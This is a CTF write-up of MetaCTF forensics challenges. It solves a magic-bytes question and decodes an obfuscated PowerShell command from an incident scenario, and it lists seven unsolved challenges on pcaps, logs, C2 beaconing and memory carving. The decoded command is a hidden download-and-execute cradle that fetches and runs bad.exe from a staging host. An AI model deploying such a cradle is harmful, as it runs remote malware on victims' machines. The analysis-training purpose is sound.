# Forensics - 9 challenges
[Magic in the Hex (100 pts)](#magic-in-the-hex-100-pts)<br>
[My Logs Know What You Did (125 pts)](#my-logs-know-what-you-did-125-pts)<br>
[I Just Wanna Run (150 pts)](#i-just-wanna-run-150-pts) *no soln*<br>
[Sharing Files and Passwords (150 pts)](#sharing-files-and-passwords-150-pts) *no soln*<br>
[Still Believe in Magic? (150 pts)](#still-believe-in-magic-150-pts) *no soln*<br>
[Et tu, Hacker? (200 pts)](#et-tu-hacker-200-pts) *no soln*<br>
[Easy as it (TCP) Streams (250 pts)](#easy-as-it-tcp-streams-250-pts) *no soln*<br>
[Pattern of Life (275 pts)](#pattern-of-life-275-pts) *no soln*<br>
[The Carver (475 pts)](#the-carver-475-pts) *no soln*<br>

## Magic in the Hex (100 pts)
> Sometimes in forensics, we run into files that have odd or unknown file extensions. In these cases, it's helpful to look at some of the file format signatures to figure out what they are. We use something called "magic bytes" which are the first few bytes of a file.
> 
> What is the ASCII representation of the magic bytes for a VMDK file? The flag format will be 3-4 letters (there are two correct answers).

Every file has a file header which tells the operating system what type of file it is. The file header is the first few bytes of the file, for example a GIF file:

```
$ file cat_hop.gif
cat_hop.gif: GIF image data, version 89a, 128 x 128

$ xxd cat_hop.gif
00000000: 4749 4638 3961 8000 8000 f700 0000 0000  GIF89a..........
```

Here we can see that the file header for GIF files is `GIF89a` and the magic bytes are `47 49 46 38 39 61`.

As we can see this [wikipedia page](https://en.wikipedia.org/wiki/List_of_file_signatures) tells us the same exact thing:

![Wikipedia page](https://i.imgur.com/7YmV7Kp.png)

We can then look for VMDK on the same page:

![Wikipedia page](https://i.imgur.com/0S2eGFp.png)

The magic bytes for VMDK are `4B 44 4D` or in ascii `KDM`.

<div align="center">

Flag:
```
KDM
```
[return to top](#top)</div>


## My Logs Know What You Did (125 pts)
> While investigating an incident, you identify a suspicious powershell command that was run on a compromised system ... can you figure out what it was doing?
> 
> `C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -noP -sta -w 1 -enc TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwOi8vTWV0YUNURntzdXBlcl9zdXNfc3Q0Z2luZ19zaXRlX2QwdF9jMG19L19iYWQuZXhlJywnYmFkLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2JhZC5leGUn`

Looks like a simple powershell command. Dissecting the command:
- `-noP` is short for `-NoProfile`: Does not load a PowerShell profile.
- `-sta`: Starts PowerShell using a single-threaded apartment.
- `-w 1` is short for `-WindowStyle <WindowStyleType>`, in this case the type 1 is `Hidden`: Hides the PowerShell window.
- `-enc TmV..` is short for `-EncodedCommand <Base64EncodedCommand>`: Base64 encoded command.

Decoding the encoded command:
```
$ echo "TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwOi8vTWV0YUNURntzdXBlcl9zdXNfc3Q0Z2luZ19zaXRlX2QwdF9jMG19L19iYWQuZXhlJywnYmFkLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2JhZC5leGUn" | base64 -d
New-Object System.Net.WebClient).DownloadFile('http://MetaCTF{super_sus_st4ging_site_d0t_c0m}/_bad.exe','bad.exe');Start-Process 'bad.exe'
```

We get the powershell script the command executes. It downloads `http://MetaCTF{super_sus_st4ging_site_d0t_c0m}/_bad.exe`, saves it as `bad.exe` and then runs it.

<div align="center">

Flag:
```
MetaCTF{super_sus_st4ging_site_d0t_c0m}
```
[return to top](#top)</div>


## I Just Wanna Run (150 pts)
> Our security team has identified evidence of ransomware deployment staging in the network. We’re trying to contain and remediate the malicious operator’s deployment staging and access before the operator successfully spreads and executes ransomware within the environment. We’ve recovered some of the operator’s [staging scripts and files](https://metaproblems.com/57fc877af48ad294da5e527eca2649a5/incident017.zip). Can you help identify which user account’s credentials the operator had compromised and is planning to use to execute the ransomware?
> 
> The flag format will be `METAL\xxxxx`

<div align="center">

Flag:
```
NOT SOLVED YET
```
[return to top](#top)</div>


## Sharing Files and Passwords (150 pts)
> FTP servers are made to share files, but if its communications are not encrypted, it might be sharing passwords as well. The password in [this pcap](https://metaproblems.com/2dd6443361555f266a8c2f54c50d01e9/ftp_challenge.pcapng) to get the flag

<div align="center">

Flag:
```
NOT SOLVED YET
```
[return to top](#top)</div>


## Still Believe in Magic? (150 pts)
> We found [an archive with a file in it](https://metaproblems.com/f03e38955de03e3d860d32dfd20b132f/magic.tar.gz), but there was no file extension so we're not sure what it is. Can you figure out what kind of file it is and then open it?

<div align="center">

Flag:
```
NOT SOLVED YET
```
[return to top](#top)</div>


## Et tu, Hacker? (200 pts)
> The law firm of William, Ian, Laura, and Lenny (WILL for short) has just been the victim of an attempted cyber attack. Someone tried to brute force the login for one of their employees. They have the [event logs](https://metaproblems.com/aa50297520b4159c83a31f5fe8f9cdeb/bruteforce.evtx) of the incident, and were wondering if you could tell them which user was targeted. Flag is in the form of MetaCTF{}.

<div align="center">

Flag:
```
NOT SOLVED YET
```
[return to top](#top)</div>


## Easy as it (TCP) Streams (250 pts)
> Caleb was designing a problem for MetaCTF where the flag would be in the telnet plaintext. Unfortunately, he accidentally stopped the [packet capture](https://metaproblems.com/46dc63e7dbfa1ca757a459063dff0959/easy_as_it_streams.pcapng) right before the flag was supposed to be revealed. Can you still find the flag? Note: You'll need to decrypt in CyberChef rather than using a command line utility. 

<div align="center">

Flag:
```
NOT SOLVED YET
```
[return to top](#top)</div>


## Pattern of Life (275 pts)
> Hackers have breached our network. We know they are there, hiding in the shadows as users continue to browse the web like normal. As a threat hunter, your job is to constantly be searching our environment for any signs of malicious behavior.
> 
> Today you just received [a packet capture (pcap)](https://static.metaproblems.com/2a641db1c19526efb7e0c99004ccba0d/pattern_of_life.pcapng) from a user's workstation. We think that an attacker may have compromised the user's machine and that the computer is beaconing out to their command and control (C2) server. Based on some other logs, we also think the attacker was *not* using a fully encrypted protocol and also did not put much care into making their C2 server look like a normal website. Your task? We'd like you to submit the port number that the C2 server is listening on in the form of `MetaCTF{portnumber}` as the flag.

<div align="center">

Flag:
```
NOT SOLVED YET
```
[return to top](#top)</div>


## The Carver (475 pts)
> Okay the more we look into this adversary in our networks, the more we realize we need to step up our analysis game. Additionally, our company's senior management are demanding we provide them more details. Are we hacked? What's the damage? What did the hacker do on the compromised machines?
> 
> Let's dive into that last question some more. We've taken [a process dump of the infected process](https://metaproblems.com/f375cac9432877ac046c0d2a2a39b156/the_carver.7z) for you. It seems that the attacker tasked their beacon to perform 4 different actions on the host. If you can extract out their payloads, then you'll find a special mark the attacker left behind (it is surrounded by `MetaCTF{}` so it will be obvious when you find it). While it won't be easy, we have faith that you're up to the task!

<div align="center">

Flag:
```
NOT SOLVED YET
```
[return to top](#top)</div>
